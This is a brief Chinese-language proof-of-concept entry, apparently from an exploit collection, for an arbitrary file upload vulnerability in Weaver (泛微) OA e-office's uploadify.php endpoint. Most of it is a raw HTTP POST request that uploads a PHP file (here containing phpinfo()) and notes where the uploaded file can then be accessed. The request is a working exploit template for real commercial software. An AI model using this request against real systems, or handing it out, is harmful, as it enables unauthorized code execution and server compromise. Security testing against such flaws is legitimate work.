﻿# 泛微OA e-office uploadify.php任意文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：访问路径 /attachment/回显的数字/a.php

> 漏洞特征：

> 验证脚本：HTTP

```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Content-Type: multipart/form-data; boundary=1

--1
Content-Disposition: form-data; name="Filedata"; filename="a.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
--1--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：泛微OA e-office uploadify.php任意文件上传漏洞.poc
